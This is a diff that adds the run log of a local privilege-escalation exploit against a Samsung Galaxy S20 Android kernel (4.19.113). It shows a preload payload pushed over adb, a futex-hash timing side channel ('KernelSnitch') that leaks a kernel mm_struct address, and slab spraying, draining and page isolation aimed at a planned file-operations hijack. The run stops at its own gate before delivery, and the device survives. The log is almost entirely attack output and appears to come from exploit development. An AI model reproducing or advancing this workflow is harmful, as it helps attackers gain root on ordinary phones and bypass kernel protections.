@@ -1,0 +1,418 @@
+=== run 2026-11-03T14:22:51-06:00 budget=1500s fresh=0 env=KS_FOPS_ROUTE=1 KS_PLANT_ALL=1
+bootreason_before=kernel_panic,null
+-rw-rw-rw- 1 shell shell  0 2026-11-03 10:50 /data/local/tmp/ghostlock_ks_cache.txt
+-rw-rw-rw- 1 shell shell 22 2026-11-03 14:15 /data/local/tmp/ks_mm_answer.txt
+/home/ubuntu/S20-SM-G986U1/build/samsung-g986u1-4.19.113/bin/preload.so: 1 file pushed, 0 skipped. 73.9 MB/s (266608 bytes in 0.003s)
+--- payload start 2026-11-03T14:22:52-06:00
+[+] exlog open path=/data/local/tmp/ks_log.txt pid=22262 uid=2000
+[+] preload starting pid=22262 log=/data/local/tmp/ks_log.txt
+[+] startup context pid=22262 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=22262 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[+] build config pid=22262 label=samsung_g986u1_4.19.113 slide=pselect main=pselect
+[+] p0 profile pid=22262 phys_offset=0000000080000000 kernel_phys_load=0000000080080000 delta=0000000000080000 slide_logger=ffffffc002c25ea8 bootid_data=ffffffc000080000 init_task=ffffffc002c2f9c0 root_tg=ffffffc003211c00 sysctl_bootid=ffffffc0033adcec
+[*] slide skipped; KASLR via configfs scan after fops hijack
+[*] MMSLAB baseline mm_struct            778    992   1024   32    8 : tunables    0    0    0 : slabdata     31     31      0
+[*] SLABPAGES baseline Slab:             478928 kB
+[*] memory detected ram=0x2c0000000 (11 GB) window_end=ffffffc2c0000000
+[*] KS_COST reps=128 mult=4 pile2_baseline=1
+[*] parameters cpu (16) mm_struct sz (400) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[*] futex_init hashsize=0x800 (cpus=8)
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->67 active=2144->2144 da=0 ds=0 cls=same
+[*] KS_SLOT tag=burst i=0 slabs=67->68 active=2144->2176 da=32 ds=1 cls=new
+[*] KS_LEAK child pid=23837 (forked mm target)
+[*] target    0000007453dd00e0
+[*] KS_PRE lead=20 fillers=32 leak_slot=1 slabs=67->68
+[*] KS_BURST slots=32 boundary_slabs=68 after_slabs=68 span_ok=1 expect=32 plan_cpu=1
+[*] KS_BUDDY_CAPTURE tries=51 sends=51 errno=0 sndbuf=16777216 cpu=0
+[*] KS_SLOT tag=control i=0 slabs=68->69 active=2176->2208 da=32 ds=1 cls=new
+[*] KS_SLOT tag=control i=1 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=2 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=3 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=4 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=5 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=6 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=7 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=8 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=9 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=10 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=11 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=12 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=13 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=14 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=15 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=16 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=17 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=18 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=19 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=20 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=21 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=22 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=23 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=24 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=25 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=26 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=27 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=28 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=29 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=30 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_SLOT tag=control i=31 slabs=69->69 active=2208->2208 da=0 ds=0 cls=same
+[*] KS_CONTROL slots=32 boundary_slabs=69 after_slabs=69 span_ok=1 expect=32 last_pid=23899
+[*] start finding collisisons
+[*] collision threshold approx=20 thr=100
+[*]   000000711d1e7838 (before=21 after=6666)
+[*]   000000711d6bdee8 (before=21 after=6672)
+[*]   000000711dab3e98 (before=21 after=6669)
+[*]   000000711e391588 (before=21 after=6667)
+[*]   000000711e5a1608 (before=21 after=6672)
+[*]   000000711f7cd768 (before=21 after=6668)
+[*]   000000711fd0d168 (before=21 after=6666)
+[*]   00000071205ba6d0 (before=21 after=6666)
+[*]   000000712088fd78 (before=22 after=6670)
+[*]   0000007120e5cbe0 (before=21 after=6671)
+[*]   00000071213f88c0 (before=21 after=6667)
+[*]   0000007121440b00 (before=21 after=6674)
+[*]   0000007121897db8 (before=21 after=6666)
+[*]   0000007121cb8ec0 (before=21 after=6668)
+[*]   0000007123263c18 (before=21 after=6669)
+[*]   0000007123d9f5f8 (before=21 after=6668)
+[*]   0000007124931288 (before=21 after=6669)
+[*]   0000007124b0f178 (before=21 after=6666)
+[*]   0000007124ee3018 (before=21 after=6667)
+[*]   000000712523cae0 (before=21 after=6672)
+[*]   000000712653f2f8 (before=21 after=6670)
+[*]   000000712655c3e0 (before=21 after=6667)
+[*]   0000007126a7dce8 (before=22 after=6666)
+[*]   000000712782aa50 (before=21 after=6667)
+[*]   0000007127d3f2f8 (before=21 after=6668)
+[*]   000000712883dae8 (before=21 after=6668)
+[*]   0000007128c6ec70 (before=21 after=6681)
+[*]   000000712954b358 (before=21 after=6670)
+[*]   0000007129b0a150 (before=21 after=6670)
+[*]   0000007129b32290 (before=21 after=6668)
+[*]   000000712a090d80 (before=21 after=6668)
+[*]   000000712b1784c0 (before=21 after=6676)
+[*]   000000712bc6fc78 (before=21 after=6669)
+[*]   000000712d709148 (before=21 after=6674)
+[*]   000000712dbbc6e0 (before=21 after=6668)
+[*]   000000712e837ab8 (before=21 after=6670)
+[*]   000000712ec59bc8 (before=21 after=6666)
+[*]   000000712ecbcee0 (before=21 after=6669)
+[*]   000000712fc74ca0 (before=21 after=6664)
+[*]   000000712feff0f8 (before=21 after=6665)
+[*]   0000007130912190 (before=21 after=6666)
+[*]   000000713308fd78 (before=21 after=6668)
+[*]   0000007133246b30 (before=21 after=6688)
+[*]   000000713346bc58 (before=22 after=6667)
+[*]   000000713388fd78 (before=21 after=6669)
+[*]   00000071383c8740 (before=21 after=6671)
+[*]   0000007138d181c0 (before=22 after=6669)
+[*]   0000007139495da8 (before=21 after=6668)
+[*]   0000007139cc9f48 (before=21 after=6666)
+[*]   000000713a9a0600 (before=21 after=6667)
+[*]   000000713adfb8d8 (before=22 after=6679)
+[*]   000000713b7fb8d8 (before=21 after=6669)
+[*]   000000713b891d88 (before=21 after=6669)
+[*]   000000713db31288 (before=21 after=6666)
+[*]   000000713dc7bcd8 (before=22 after=6672)
+[*]   000000713e4e3018 (before=21 after=6669)
+[*]   000000713e864c20 (before=21 after=6672)
+[*]   000000713f052b90 (before=21 after=6669)
+[*]   0000007140a4ab50 (before=21 after=6667)
+[*]   0000007140ce4020 (before=21 after=6669)
+[*]   0000007140dca750 (before=21 after=6671)
+[*]   0000007140f33298 (before=21 after=6666)
+[*]   0000007141895da8 (before=21 after=6669)
+[*]   0000007142aa9e48 (before=21 after=6678)
+[*]   0000007143c1b9d8 (before=21 after=6666)
+[*]   0000007144130280 (before=21 after=6666)
+[*]   00000071442c4f20 (before=22 after=6666)
+[*]   0000007144427a38 (before=21 after=6667)
+[*]   0000007144c63c18 (before=22 after=6667)
+[*]   0000007144f09148 (before=21 after=6668)
+[*]   00000071461fc8e0 (before=22 after=6671)
+[*]   000000714687dce8 (before=21 after=6668)
+[*]   0000007146ec0f00 (before=21 after=6665)
+[*]   0000007146fb2690 (before=21 after=6668)
+[*]   0000007147457bb8 (before=21 after=6670)
+[*]   0000007147a9edf0 (before=21 after=5594)
+[*]   00000071484f50a8 (before=21 after=6667)
+[*]   0000007148985528 (before=22 after=6665)
+[*]   0000007148b49348 (before=21 after=6666)
+[*]   00000071499e1808 (before=21 after=6686)
+[*]   0000007149cf2090 (before=21 after=6669)
+[*]   000000714a3362b0 (before=21 after=6668)
+[*]   000000714a4fe0f0 (before=21 after=6668)
+[*]   000000714b0f90c8 (before=21 after=6674)
+[*]   000000714b4aee70 (before=21 after=6667)
+[*]   000000714be02910 (before=21 after=6665)
+[*]   000000714c5a4620 (before=21 after=6667)
+[*]   000000714c789548 (before=21 after=6671)
+[*]   000000714cac4f20 (before=21 after=6670)
+[*]   000000714cb33298 (before=21 after=6668)
+[*]   000000714dbe9848 (before=21 after=6668)
+[*]   000000714f9cb758 (before=21 after=6668)
+[*]   0000007150b08140 (before=21 after=6667)
+[*]   00000071512a3e18 (before=22 after=6666)
+[*]   000000715150b158 (before=21 after=6682)
+[*]   0000007151f21208 (before=21 after=6667)
+[*]   00000071529965b0 (before=21 after=6667)
+[*]   0000007152e85d28 (before=21 after=6668)
+[*]   0000007153d151a8 (before=21 after=6666)
+[*]   0000007155031a88 (before=21 after=6670)
+[*]   000000715610b158 (before=21 after=6671)
+[*]   00000071566e8040 (before=21 after=6666)
+[*]   00000071568fb0d8 (before=22 after=6669)
+[*]   0000007156a9edf0 (before=21 after=6667)
+[*]   0000007156ef90c8 (before=21 after=6669)
+[*]   00000071573774b8 (before=21 after=6671)
+[*]   0000007158743318 (before=21 after=6667)
+[*]   0000007159192590 (before=21 after=6665)
+[*]   0000007159a2da68 (before=21 after=6671)
+[*]   000000715a283d18 (before=22 after=6668)
+[*]   000000715a4fe0f0 (before=21 after=6666)
+[*]   000000715a553398 (before=21 after=6674)
+[*]   000000715adb76b8 (before=21 after=6669)
+[*]   000000715ae61c08 (before=22 after=6670)
+[*]   000000715c15d3e8 (before=22 after=6670)
+[*]   000000715c28fd78 (before=21 after=6668)
+[*] pile2 anchor id=11565112 addr=000000711d1e7838 align=0 value=0
+[*] start second pile id=11565112 addr=000000711d1e7838
+[*]   pile2 000000711d1e7838 (before=21 after=226)
+[*]   pile2 000000711d6bdee8 (before=21 after=6820)
+[*]   pile2 000000711dab3e98 (before=21 after=6820)
+[*]   pile2 000000711e391588 (before=21 after=6820)
+[*]   pile2 000000711e5a1608 (before=21 after=6820)
+[*]   pile2 000000711f7cd768 (before=22 after=6819)
+[*]   pile2 000000711fd0d168 (before=21 after=6824)
+[*]   pile2 00000071205ba6d0 (before=21 after=6832)
+[*]   pile2 000000712088fd78 (before=21 after=6820)
+[*]   pile2 0000007120e5cbe0 (before=21 after=5676)
+[*]   pile2 00000071213f88c0 (before=21 after=6822)
+[*]   pile2 0000007121440b00 (before=21 after=6821)
+[*]   pile2 0000007121897db8 (before=21 after=6820)
+[*]   pile2 0000007121cb8ec0 (before=21 after=6821)
+[*]   pile2 0000007123263c18 (before=22 after=6819)
+[*]   pile2 0000007123d9f5f8 (before=21 after=6820)
+[*]   pile2 0000007124931288 (before=21 after=6820)
+[*]   pile2 0000007124b0f178 (before=22 after=6818)
+[*]   pile2 0000007124ee3018 (before=21 after=6821)
+[*]   pile2 000000712523cae0 (before=21 after=6820)
+[*]   pile2 000000712653f2f8 (before=21 after=6820)
+[*]   pile2 000000712655c3e0 (before=21 after=6816)
+[*]   pile2 0000007126a7dce8 (before=21 after=6820)
+[*]   pile2 000000712782aa50 (before=21 after=6821)
+[*]   pile2 0000007127d3f2f8 (before=22 after=6819)
+[*]   pile2 000000712883dae8 (before=21 after=6819)
+[*]   pile2 0000007128c6ec70 (before=21 after=6820)
+[*]   pile2 000000712954b358 (before=21 after=6829)
+[*]   pile2 0000007129b0a150 (before=21 after=6822)
+[*]   pile2 0000007129b32290 (before=21 after=6824)
+[*]   pile2 000000712a090d80 (before=21 after=6818)
+[*]   pile2 000000712b1784c0 (before=22 after=6818)
+[*]   pile2 000000712bc6fc78 (before=21 after=6820)
+[*]   pile2 000000712d709148 (before=21 after=6820)
+[*]   pile2 000000712dbbc6e0 (before=21 after=6823)
+[*]   pile2 000000712e837ab8 (before=21 after=6820)
+[*]   pile2 000000712ec59bc8 (before=21 after=6817)
+[*]   pile2 000000712ecbcee0 (before=21 after=6823)
+[*]   pile2 000000712fc74ca0 (before=21 after=6819)
+[*]   pile2 000000712feff0f8 (before=21 after=6820)
+[*]   pile2 0000007130912190 (before=21 after=6822)
+[*]   pile2 000000713308fd78 (before=21 after=6822)
+[*]   pile2 0000007133246b30 (before=21 after=6819)
+[*]   pile2 000000713346bc58 (before=21 after=6819)
+[*]   pile2 000000713388fd78 (before=21 after=6819)
+[*]   pile2 00000071383c8740 (before=21 after=6829)
+[*]   pile2 0000007138d181c0 (before=21 after=6820)
+[*]   pile2 0000007139495da8 (before=21 after=6819)
+[*]   pile2 0000007139cc9f48 (before=21 after=6818)
+[*]   pile2 000000713a9a0600 (before=21 after=6819)
+[*]   pile2 000000713adfb8d8 (before=22 after=6819)
+[*]   pile2 000000713b7fb8d8 (before=21 after=6820)
+[*]   pile2 000000713b891d88 (before=21 after=6821)
+[*]   pile2 000000713db31288 (before=21 after=6818)
+[*]   pile2 000000713dc7bcd8 (before=21 after=6819)
+[*]   pile2 000000713e4e3018 (before=21 after=6822)
+[*]   pile2 000000713e864c20 (before=21 after=6821)
+[*]   pile2 000000713f052b90 (before=21 after=6827)
+[*]   pile2 0000007140a4ab50 (before=21 after=6819)
+[*]   pile2 0000007140ce4020 (before=21 after=6820)
+[*]   pile2 0000007140dca750 (before=21 after=6820)
+[*]   pile2 0000007140f33298 (before=21 after=6819)
+[*]   pile2 0000007141895da8 (before=21 after=6821)
+[*]   pile2 0000007142aa9e48 (before=21 after=6819)
+[*]   pile2 0000007143c1b9d8 (before=21 after=6819)
+[*]   pile2 0000007144130280 (before=21 after=6819)
+[*]   pile2 00000071442c4f20 (before=21 after=6821)
+[*]   pile2 0000007144427a38 (before=21 after=6819)
+[*]   pile2 0000007144c63c18 (before=21 after=6844)
+[*]   pile2 0000007144f09148 (before=22 after=6823)
+[*]   pile2 00000071461fc8e0 (before=22 after=6819)
+[*]   pile2 000000714687dce8 (before=21 after=6819)
+[*]   pile2 0000007146ec0f00 (before=21 after=6821)
+[*]   pile2 0000007146fb2690 (before=21 after=6823)
+[*]   pile2 0000007147457bb8 (before=21 after=6820)
+[*]   pile2 0000007147a9edf0 (before=21 after=6825)
+[*]   pile2 00000071484f50a8 (before=22 after=6820)
+[*]   pile2 0000007148985528 (before=21 after=6820)
+[*]   pile2 0000007148b49348 (before=21 after=6817)
+[*]   pile2 00000071499e1808 (before=21 after=6823)
+[*]   pile2 0000007149cf2090 (before=22 after=6822)
+[*]   pile2 000000714a3362b0 (before=21 after=6821)
+[*]   pile2 000000714a4fe0f0 (before=21 after=6820)
+[*]   pile2 000000714b0f90c8 (before=21 after=6818)
+[*]   pile2 000000714b4aee70 (before=21 after=6821)
+[*]   pile2 000000714be02910 (before=22 after=6820)
+[*]   pile2 000000714c5a4620 (before=21 after=6821)
+[*]   pile2 000000714c789548 (before=21 after=6819)
+[*]   pile2 000000714cac4f20 (before=21 after=6821)
+[*]   pile2 000000714cb33298 (before=21 after=6820)
+[*]   pile2 000000714dbe9848 (before=21 after=6821)
+[*]   pile2 000000714f9cb758 (before=21 after=6821)
+[*]   pile2 0000007150b08140 (before=21 after=6822)
+[*]   pile2 00000071512a3e18 (before=21 after=6818)
+[*]   pile2 000000715150b158 (before=21 after=6819)
+[*]   pile2 0000007151f21208 (before=21 after=6819)
+[*]   pile2 00000071529965b0 (before=21 after=6821)
+[*]   pile2 0000007152e85d28 (before=21 after=6820)
+[*]   pile2 0000007153d151a8 (before=21 after=6818)
+[*]   pile2 0000007155031a88 (before=21 after=6821)
+[*]   pile2 000000715610b158 (before=21 after=6822)
+[*]   pile2 00000071566e8040 (before=21 after=6818)
+[*]   pile2 00000071568fb0d8 (before=21 after=6820)
+[*]   pile2 0000007156a9edf0 (before=21 after=6819)
+[*]   pile2 0000007156ef90c8 (before=21 after=6820)
+[*]   pile2 00000071573774b8 (before=22 after=6826)
+[*]   pile2 0000007158743318 (before=21 after=6820)
+[*]   pile2 0000007159192590 (before=21 after=6820)
+[*]   pile2 0000007159a2da68 (before=21 after=6818)
+[*]   pile2 000000715a283d18 (before=21 after=6822)
+[*]   pile2 000000715a4fe0f0 (before=21 after=6819)
+[*]   pile2 000000715a553398 (before=22 after=6821)
+[*]   pile2 000000715adb76b8 (before=22 after=6819)
+[*]   pile2 000000715ae61c08 (before=21 after=6835)
+[*]   pile2 000000715c15d3e8 (before=21 after=6821)
+[*]   pile2 000000715c28fd78 (before=21 after=6819)
+[*] found 16 accepted collisions (pile1=116 pile2=116)
+[*] KS_PC export path=/data/local/tmp/ks_collisions.txt accepted=16 candidates=116/116 hashsize=0x800
+[*] KS_PC waiting up to 60s poll_ms=1000 for /data/local/tmp/ks_mm_answer.txt
+[-] KS_PC answer rejected hash mm=ffffffc1b3520400 addr=000000711d1e7838 i=1
+[*] KS_CACHE hit path=/data/local/tmp/ks_cache.txt anchor=ffffffc1b3520400 start=ffffffc000000000 end=ffffffc2c0000000 radius=8GB
+[*] start bruteforcing
+[*] [  1] start finding mm_struct [ffffffc040000000-ffffffc0c0000000]
+[*] [  2] start finding mm_struct [ffffffc080000000-ffffffc140000000]
+[*] [  5] start finding mm_struct [ffffffc180000000-ffffffc240000000]
+[*] [  3] start finding mm_struct [ffffffc100000000-ffffffc180000000]
+[*] [  0] start finding mm_struct [ffffffc000000000-ffffffc080000000]
+[*] [  4] start finding mm_struct [ffffffc140000000-ffffffc1c0000000]
+[*] [  6] start finding mm_struct [ffffffc200000000-ffffffc280000000]
+[*] [  7] start finding mm_struct [ffffffc240000000-ffffffc2c0000000]
+[-] KS_PC answer rejected hash mm=ffffffc1b3520400 addr=000000711d1e7838 i=1
+[-] KS_PC answer rejected hash mm=ffffffc1b3520400 addr=000000711d1e7838 i=1
+[-] KS_PC answer rejected hash mm=ffffffc1b3520400 addr=000000711d1e7838 i=1
+[-] KS_PC answer rejected hash mm=ffffffc1b3520400 addr=000000711d1e7838 i=1
+[-] KS_PC answer rejected hash mm=ffffffc1b3520400 addr=000000711d1e7838 i=1
+[-] KS_PC answer rejected hash mm=ffffffc1b3520400 addr=000000711d1e7838 i=1
+[-] KS_PC answer rejected hash mm=ffffffc1b3520400 addr=000000711d1e7838 i=1
+[-] KS_PC answer rejected hash mm=ffffffc1b3520400 addr=000000711d1e7838 i=1
+[*] CANDIDATE mm=ffffffc0a3af8400 need=15
+[*] bruteforce dbg_any_match=39108 (candidates where >=2 addrs shared bucket)
+[*] KernelSnitch mm found addr=ffffffc0a3af8400 sz=0x400
+[*] KS_CACHE save path=/data/local/tmp/ks_cache.txt anchor=ffffffc0a3af8400
+[*] KS_TARGET_CHILD_CPU pid=23837 cpu=3
+[*] KS_LEAK child pid=23837 done state=4
+[*] KS_TIME leak_ms=513669
+[*] MMSLAB pre-saturate mm_struct           2272   2272   1024   32    8 : tunables    0    0    0 : slabdata     71     71      0
+[*] SLABPAGES pre-saturate Slab:             583316 kB
+[*] KS_PARTIAL slabs=16 kept=64
+[*] MMSLAB post-saturate mm_struct           1891   2272   1024   32    8 : tunables    0    0    0 : slabdata     71     71      0
+[*] SLABPAGES post-saturate Slab:             562020 kB
+[*] KS_BUDDY_FILL bytes=36480 errno=0
+[*] MMSLAB post-target mm_struct           1891   2272   1024   32    8 : tunables    0    0    0 : slabdata     71     71      0
+[*] SLABPAGES post-target Slab:             561896 kB
+[*] KS_DELTA delta=0 default (mm offset=00000000a3af8400)
+[*] KS_TIME page_prep_ms=514076
+[*] KSLAB_BASE_CANDIDATE mm=ffffffc0a3af8400 base=ffffffc0a3af8000 idx=0
+[*] KS_LEAK_TARGET mm=ffffffc0a3af8400 prio_read=ffffffc0a3af8400
+[*] KS_PUNCH_DUMP intent tag=intent base=ffffffc0a3af8000 lock=ffffffc0a3af9350 w0=ffffffc0a3afa220 task=ffffffc0a3afb200 fops=ffffffc0a3af9000 bias=e80 rb_root=ffffffc0a3afa220 leftmost=ffffffc0a3afa220 owner=ffffffc0a3afb201 w0_lock=ffffffc0a3af9350 blocked=ffffffc0a3afa220
+[*] MMSLAB post-release mm_struct           1891   2272   1024   32    8 : tunables    0    0    0 : slabdata     71     71      0
+[*] SLABPAGES post-release Slab:             561684 kB
+[*] KS_DRAIN_LIMIT cpu_partial=6 drain_slabs=8 pre_slabs=16 slabs=24
+[*] KS_TRIGGER prepared slabs=24 refs=768 cpu=0
+[*] MMSLAB pre-spray mm_struct           2560   2560   1024   32    8 : tunables    0    0    0 : slabdata     80     80      0
+[*] SLABPAGES pre-spray Slab:             602880 kB
+[*] MMSLAB sweep n=1024/32/32/512 live=1024/0/0/0 closed=1024/0/0/0 killed=1024/0/0/0 mm_struct           1739   2048   1024   32    8 : tunables    0    0    0 : slabdata     64     64      0
+[*] SLABPAGES sweep n=1024/32/32/512 live=1024/0/0/0 closed=1024/0/0/0 killed=1024/0/0/0 Slab:             545408 kB
+[*] MMSLAB post-sweep mm_struct           1739   2048   1024   32    8 : tunables    0    0    0 : slabdata     64     64      0
+[*] SLABPAGES post-sweep Slab:             545408 kB
+[*] KS_TRIGGER fired slabs=16 cpu=0
+[*] KS_TARGET base=ffffffc0a3af8000 mm=ffffffc0a3af8400 pinned=1
+[*] MMSLAB post-spray-kill mm_struct           1496   1888   1024   32    8 : tunables    0    0    0 : slabdata     59     59      0
+[*] SLABPAGES post-spray-kill Slab:             540332 kB
+[*] SLAB32 post-spray-kill absent
+[*] KS_BUDDY_HOLD blocks=8 cpu=0
+[*] KS_NEIGHBOR_HOLD blocks=8 base=ffffffc0a3af8000 buddy=ffffffc0a3af0000 scope=order3-page
+[*] KS_BUDDY_HELD base=ffffffc0a3af8000 buddy=ffffffc0a3af0000 held_order3_blocks=8 neighbour_children=64 sibling=unmeasured reason=pagemap-pfn-needs-CAP_SYS_ADMIN
+[*] MMSLAB post-isolate mm_struct           1496   1888   1024   32    8 : tunables    0    0    0 : slabdata     59     59      0
+[*] SLABPAGES post-isolate Slab:             539160 kB
+[*] KS_TARGET_TGID pre=1 pid=23867
+[*] KS_TARGET memfds_closed=0 memfd=none base=ffffffc0a3af8000 cpu=0
+[*] KS_HEAD_WARM bytes=3712 want=3712 errno=0
+[*] KS_HEAD_DRAIN bytes=3712 want=3712 errno=0
+[*] KS_SLAB_ALIVE slots=32 alive=31 zombie=0 gone=0 target=S exclusive=1
+[*] KS_SLAB_OWNERS slots=32 fillers=31 target=1 total=32 post_ctx=32 lead_ctx=20 cpu=0
+[*] KS_PIN group=pre fillers=31 ready=0 cpu0=30 other=1 ok=0
+[*] KS_PIN group=control fillers=31 ready=0 cpu0=31 other=0 ok=0
+[*] KS_CONTROL_PINNED fillers=31 kept_pid=23899 cpu=0 empty_cpu=1
+[*] KS_SEEDER pid=5695 slots=32 ready=1 forked=33 cpu=1 parent_cpu=0 empty_cpu=1
+[*] KS_FREEZER children=1024 pages=32 free_before=392 active=1496 num=1888 slabs=59 cpu=0
+[*] KS_PREDRAIN pushes=64 drop=0 cpu=0
+[*] KS_FILL_DELTA fillers=31 active=2528->2528 d_active=0 d_num=0 d_slabs=0 page_was_full=1
+[*] KS_FREEZE fillers=31 target_pid=23867 cpu=0 empty_cpu=1
+[*] KS_CTL_FREEZE fillers=31 kept_pid=23899 cpu=0
+[*] KS_FREEZE_WAIT ms=2 cpu=0
+[*] KS_FREEZE_SAMPLE active=2528 num=2528 slabs=79 pre_active=1496
+[*] KS_EMPTY_PLAN cpu=1 expect=1
+[*] KS_DRAIN pushes=128 need=5 cpu=0
+[*] KS_DRAIN_BASE active=2395 num=2528 slabs=79
+[*] KS_FREE_CPU pid=23867 cpu=1 expect=1 ok=1
+[*] KS_QUIESCE active=2395 num=2528 slabs=79 stable=1 window=gate
+[*] KS_POSTDRAIN_SAMPLE active=2394 num=2528 slabs=79
+[*] KS_DRAIN d=128 pid=-1 cpu=-1->-1 pobjects=128 limit=6 cross=1 empty=1 stage=after_unfreeze
+[*] KS_EMPTYING kind=target-exit draining_cpu=1 cpu=1->1 page=n_partial expect=discard
+[*] KS_SAMPLE1 tag=crossing active=2395 num=2528 slabs=79
+[*] KS_SAMPLE2 tag=empty active=2394 num=2528 slabs=79
+[*] KS_CTL_TIGHT us=4552 active=2393 num=2496 slabs=78 d_active=-1 d_num=-32 d_slabs=-1 discarded=1 state=listed-discarded
+[*] KS_SETTLE ms=50 active=2393 num=2496 slabs=78 d_from_empty=-1/-32/-1 d_from_ctl=0/0/0
+[*] KS_DRAIN_RESULT fed=128 crossed=1 crossed_at=128 target=1 pobjects=128 limit=6 min_partial=5
+[*] KS_GATE span_ok=1 crossed_at=128 min_partial=5 empty_cpu=1 registered=1 discarded=0 image=3 gap_ms=0.059 d_empty=-1 d_num=0 d_slabs=0 pin_bad=1 slot_partial=0 preconditions=0
+[*] KS_RESULT verified=address,anchor,transition unverified=reclamation,identity,consumption base=ffffffc0a3af8000
+[*] KS_TARGET_FREE waited_ms=20 iso=1496/1888/59 gate=2395/2528/79 post=2393/2496/78 crossed_at=128
+[*] KS_TARGET_REASON base_page=gate-failed cpu=1 crossed_at=128
+[*] KS_EMPTY_FREE kind=target-exit cpu=1->1 draining=1 ok=1
+[*] MMSLAB post-drain active_objs=2393 num_objs=2496 slabdata=78
+[*] KS_DISCARD post active_objs=2393 num_objs=2496 slabdata=78
+[*] KS_STATE stage=gate outcome=refused samples=2 missing=0 report=1 cleanup=skipped refusal=gate-preconditions base=ffffffc0a3af8000
+[!] KS_DELIVERY skipped=1 reason=gate-preconditions base=ffffffc0a3af8000
+payload_exit=255 at 2026-11-03T14:31:35-06:00
+DEVICE=ALIVE bootreason_after=kernel_panic,null
+LOG=/home/ubuntu/runs/20261103_142251.log
